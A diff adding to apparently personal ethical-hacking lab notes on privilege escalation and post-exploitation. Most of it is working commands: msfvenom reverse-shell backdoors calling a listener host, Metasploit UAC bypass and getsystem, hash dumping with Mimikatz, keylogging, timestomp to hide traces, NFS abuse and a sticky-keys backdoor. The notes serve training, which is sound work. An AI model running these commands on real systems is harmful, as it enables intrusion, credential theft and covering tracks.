@@ -50,3 +50,125 @@ s_string_variable(“0”);
 - msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”
   - Here, -p: payload, local IP address: 10.10.1.13, listening port: 4444., -f: filetype, -a: architecture, -b: bad character.
 
+
+Privileges are a security role assigned to users for specific programs, features, OSes, functions, files, or codes. They limit access by type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical privilege escalation and horizontal privilege escalation.
+
+- Horizontal Privilege Escalation: An unauthorized user tries to access the resources, functions, and other privileges that belong to an authorized user who has similar access permissions
+
+- Vertical Privilege Escalation: An unauthorized user tries to gain access to the resources and functions of a user with higher privileges such as an application or site administrator
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+sessions -i 1 
+
+run post/windows/gather/smart_hashdump
+
+getsystem -t 1
+: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.
+
+ use exploit/windows/local/bypassuac_fodhelper 
+ set SESSION 1
+ set payload windows/meterpreter/reverse_tcp
+ 
+ getsystem -t 1
+ run post/windows/gather/smart_hashdump
+ 
+ 
+ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
+ 
+ ```
+While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.
+
+To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.
+
+- timestomp Secret.txt -v 
+- timestomp Secret.txt -m “02/11/2018 08:10:03”
+  - -m: specifies the modified value.
+  - Accessed (-a), Created (-c), and Entry Modified (-e) 
+- search -f [Filename.extension]
+- keyscan_start 
+  - start capturing all keyboard input from the target system.
+- dir /a:h 
+  - retrieve the directory names with hidden attributes.
+- sc queryex type=service state=all 
+  - list all the available services
+- netsh firewall show state
+- netsh firewall show config
+- wmic /node:"" product get name,version,vendor 
+  - view the details of installed software.
+- wmic cpu get
+- wmic useraccount get name,sid 
+  - retrieve login names and SIDs of the users.
+- wmic os where Primary='TRUE' reboot 
+  - reboot the target system.
+
+![image](https://user-images.githubusercontent.com/79740895/226418913-1c73a227-5caa-40c2-a229-44a9110baf72.png)
+
+Exploiting Vulnerability in pkexec
+- Polkit or Policykit is an authorization API used by programs to elevate permissions and run processes as an elevated user.The successful exploitation of the Polkit pkexec vulnerability allows any unprivileged user to gain root privileges on the vulnerable host.
+
+- In the pkexec.c code, there are parameters that doesn’t handle the calling correctly which ends up in trying to execute environment variables as commands. Attackers can exploit this vulnerability by designing an environment variable in such a manner that it will enable pkexec to execute an arbitrary code.
+
+Misconfigured NFS
+- Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.
+
+- showmount -e 10.10.1.9 
+  - check if any share is available for mount in the target machine.
+- sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
+- find / -name "*.txt" -ls 2> /dev/null 
+  - view all the .txt files on the system
+- find / -perm -4000 -ls 2> /dev/null 
+  - view the SUID executable binaries.
+
+Exploiting Sticky Keys
+- Sticky keys is a Windows accessibility feature that causes modifier keys to remain active, even after they are released. Sticky keys help users who have difficulty in pressing shortcut key combinations. They can be enabled by pressing Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, previleged access to the machine.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+search bypassuac
+use exploit/windows/local/bypassuac_fodhelper
+getsystem -t 1 
+
+use post/windows/manage/sticky_keys
+```
+
+Gather Hashdump using Mimikatz
+- Mimikatz is a post exploitation tool that enables users to save and view authentication credentials such as kerberos tickets, dump passwords from memory, PINs, as well as hashes. It enables you to perform functions such as pass-the-hash, pass-the-ticket, and makes post exploitation lateral movement within a network.
+
+bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.
+
+- load kiwi 
+  - load mimikatz.
+- help kiwi 
+  - view all the kiwi commands.
+- lsa_dump_sam 
+  - load NTLM Hash of all users.
+- lsa_dump_secrets
+  - LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.
+- password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
+
+
+Discussed below are some of the remote code execution techniques:
+
+- Exploitation for client execution
+- Scheduled task
+- Service execution
+- Windows Management Instrumentation (WMI)
+- Windows Remote Management (WinRM)
+
+Hiding Files: Hiding files is the process of hiding malicious programs using methods such as rootkits, NTFS streams, and steganography techniques to prevent the malicious programs from being detected by protective applications such as Antivirus, Anti-malware, and Anti-spyware applications that may be installed on the target system. This helps in maintaining future access to the target system as a hidden malicious file provides direct access to the target system without the victim’s consent.
+
+
+
+
+
+
+
+
+
+
